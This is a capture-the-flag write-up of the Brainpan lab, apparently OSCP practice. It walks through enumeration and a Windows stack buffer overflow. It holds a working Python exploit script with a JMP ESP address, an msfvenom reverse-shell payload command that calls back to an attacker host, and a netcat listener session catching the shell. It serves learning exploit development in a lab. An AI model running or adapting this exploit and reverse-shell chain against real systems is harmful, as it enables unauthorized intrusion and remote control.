# BrainPan

Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. 

# Initial Enumeration:

### NMAP

```
# nmap -Pn -sV -sC THM_TARGET
...
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
| _|                                                                 _|      
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|    
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|  _|   _|    _|  
|
[________________________ WELCOME TO BRAINPAN _________________________]
                        ENTER THE PASSWORD
                                >>

10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=5/31%Time=6A1C692E%P=x86_64-pc-linux-gnu%r(NU
...
```
Two ports: 9999 abyss? likely a running process similar to earlier CTF running on 9999. Tested with netcat IP 9999 and sure enought the same screen appeared to ascii art from nmap requesting password.
Port 10000 was a simpleHTTPServer accessible via web browser. Displaying web page "Are you practicing safe coding?" referencing 2011 as proved to be year of the hack suggesting old content.

### Gobuster 
A quick search of port 10000 showed one folder of interest and its contents accessible via browser.
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/openvpn-troubleshooting-2025-infra-upgrades]
└─$ gobuster dir -u http://10.49.167.39:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.167.39:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
bin                  (Status: 301) [Size: 0] [--> /bin/]
```
In IP:10000/bin/ was a single exe file brainpan.exe. 
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainPan]
└─$ file brainpan.exe                     
brainpan.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 5 sections
```
PE32 executable
It’s a Windows binary, 32‑bit, compiled for x86.

Windows 4.00
This corresponds to Windows NT 4.0 era toolchains — extremely old.

### Test brainpan.exe

- Loaded on a Windows 8 VM in immunity I used a python script to send 100,200, and 1000 Ascii character \x41 or A. Only when 2000 used did it crash the application. 
- To determine the EIP next I used msf-pattern_create -l 1000 then determined its position of EIP offset with msf-pattern_offset -q <4 characters in EIP>

```
└─$ msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3A...
...
└─$ nc Target_IP 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2A...
...
└─$ msf-pattern_offset -q 35724134
[*] Exact match at offset 524
                                         
```
Now offset determined, next quick look at badchar that might affect it.
- Ran similar python script added 4 * b'B' and added bad char list from \x01 to \xff
- No clear sign of bad char not displayed, they all appeared visible so assume only \x00 is bad.
- This also verified EIP offset 524 with EIP filled with 42424242 as expected.

Use Mona to find a JMP ESP gadget to jump to ESP and use its location in the EIP to kick start into the nop sled leading to shellcode. 
- JMP ESP location best suited was 0x311712f3 

```
# mona.py output

| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                       |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------------- |
...
| 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False | False    | False  | -1.0- [brainpan.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe) 0x0 |
...
| 0x75500000 | 0x7550a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                     |
...
----------

## Results

0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe), 0x0
```
Then that just leads us to preparing a shell code we know its windows so:
```
msfvenom -p windows/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
```
Then implement the combined python code: 
```
import socket
import sys

padding = b'A' * 524  
EIP = b"\xf3\x12\x17\x31"
nop = b"\x90"  * 16
shellcode = (b"\xda\xd3\xb8\xa1\x9f\xcf\xe3\xd9\x74\x24\xf4\x5b\x2b\xc9"
...
b"\xb5")

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('Target_IP',9999))
	s.recv(1024)
	s.send(padding + EIP + nop + shellcode + b'\r\n')
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
### Reverse shell success

First thing I notice and learnt was whoami failed. Turns out whoami did not exist in early Windows NT (NT 3.x / NT 4.0 era). It was introduced much later (Windows XP / Server 2003).
The closest it had was echo %USERNAME% and hostname which work in all later versions of windows.

Next check set to see environment variables, ver to see the OS version, tasklist to list running processes.

On first inspection a script Checksrv.sh appears to keep brainpan.exe and SimpleHTTPServer running:
```
Z:\home\puck>type checsrv.sh
File not found.

Failed to open 'checsrv.sh'

Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 

Z:\home\puck>
```
### Mona Commands some interesting too look into
1. !mona bytearray -b "\x00"
Purpose:  
Generate a full test bytearray (\x01 → \xff) excluding known bad chars.

Why:  
You send this into the vulnerable program to detect bad characters — bytes that get altered, removed, or terminate the buffer.

In Brainpan:  
Only \x00 is bad.
Everything else survives unchanged.

2. !mona compare -f C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a ESP
Purpose:  
Compare the bytearray you sent with what appears in memory at the address you specify (usually ESP).

Why:
Quicker than copying bytearray.md python in to a seperate python script to run through ESP.
This identifies which bytes are corrupted by the program.
Results questionable tests showed only 1 unmodified out of 255 characters and then states /x01 as only possibly bad char.
```

[+] Comparing with memory at location : 0x0028eec8 (Stack)
Only 1 original bytes of 'normal' code found.
    ,-----------------------------------------------.
    | Comparison results:                           |
    |-----------------------------------------------|
  0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
    |00 00 4f 00 00 00 4f 00 00 00 00 00 00 00 4f 00| Memory
 10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
    |08 ef 28 00 5d 76 a0 77 01 00 00 00 00 00 4f 00| Memory
 20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
    |00 00 00 00 0f 6c 9c 77 00 00 4f 00 01 00 00 00| Memory
 30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
    |00 00 4f 00 00 00 00 00 5c ef 28 00 32 00 00 00| Memory
 40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
    |82 85 96 77 00 00 4f 00 95 ad 9a 77 f8 3b    00| Memory
 50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
    |02 00 04 06 b1 1a 96 77 54 00 04 50 38 00 00 00| Memory
 60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
    |30 00 00 00 48 9d 4f 00 c0 00 4f 00 7f 00 00 00| Memory
 70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
    |8c 02 4f 00 20 00 00 00 00 00 4f 00 54 00 00 00| Memory
 80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
    |6c ef 28 00 00 00 00 00 a0 d6 9b 77 a0 01 00 00| Memory
 90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
    |fe ff ff ff 5a 68 a0 77 d8 9e 4f 00 f8 3b 4f 00| Memory
 a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
    |00 00 00 00 90 02 00 00 54 00 00 00 f8 3b 4f 00| Memory
 b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
    |01 00 00 01 c0 00 4f 00 00 00 00 00 34 00 00 00| Memory
 c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
    |01 00 00 00 01 00 00 00 00 00 00 00 54 00 00 00| Memory
 d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
    |40 9d 4f 00 42 9d 4f 00 48 9d 4f 00 6b 01 10 50| Memory
 e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
    |40 9d 4f 00 48 9d 4f 00 e4 03 4f 00 00 00 04 04| Memory
 f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
    |00 00 4f 00 1c 00 00 00 50 01 00 00 18 73 1e   | Memory
    `-----------------------------------------------'

              | File      | Memory    | Note       
---------------------------------------------------
0  0  78  78  | 01 ... 4e | 00 ... 3b | corrupted  
78 78 1   1   | 4f        | 4f        | unmodified!
79 79 176 176 | 50 ... ff | 00 ... 1e | corrupted  

First mismatching byte: 01
Possibly bad chars: 01
Bytes omitted from input: 00
```
### Reverse shell initial connection:

```
┌──(hacktopuser㉿hacktop)-[~]
└─$ nc -lnvp 7777              
listening on [any] 7777 ...
connect to [192.168.159.255] from (UNKNOWN) [10.49.167.39] 42024
CMD Version 1.4.1

Z:\home\puck>dir
...
  3/6/2013   3:23 PM           513  checksrv.sh
  3/4/2013   2:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,805,817,856 bytes free
...
```
